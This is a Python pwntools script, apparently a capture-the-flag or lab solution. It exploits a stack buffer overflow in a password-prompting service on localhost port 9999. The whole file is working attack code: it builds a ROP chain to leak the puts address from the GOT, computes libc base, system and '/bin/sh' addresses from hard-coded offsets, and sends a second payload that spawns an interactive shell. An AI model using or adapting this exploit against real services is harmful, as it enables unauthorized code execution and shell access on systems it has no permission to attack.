from pwn import *
from LibcSearcher import *

if __name__ == "__main__":
    length = 72
    stop_gadget = 0x4006b6
    brop_gadget = 0x4007ba
    rdi_ret = 0x4007c3
    ret_addr = rdi_ret + 0x1  # balance stack 
    puts_plt = 0x400560
    puts_got = 0x601018  # where puts lies in libc
    
    io = remote('127.0.0.1',9999)
    io.recvuntil(b'password?\n')
    payload = b'A'*length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
    io.sendline(payload)
    result = io.recvuntil('\nWelCome',drop=True)
    puts_addr = u64(result.ljust(8,b'\x00')) # left-justed, paded with '\x00'
    print(hex(puts_addr)) 
    offset_binsh = 0x1b45bd
    offset_system = 0x0000000000052290
    offset_puts = 0x0000000000084420
    libcBase = puts_addr - offset_puts
    binsh_addr = libcBase + offset_binsh
    system_addr = libcBase + offset_system
    # Using LibcSearcher usually meets failure
    # libc = LibcSearcher('puts',puts_addr)
    # libcBase = puts_addr - libc.dump('puts')
    # system_addr = libcBase + libc.dump('system')
    # binsh_addr = libcBase + libc.dump('str_bin_sh')
    payload = b'A'*length + p64(ret_addr) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)
    io.sendlineafter(b'password?\n',payload)
    io.interactive()
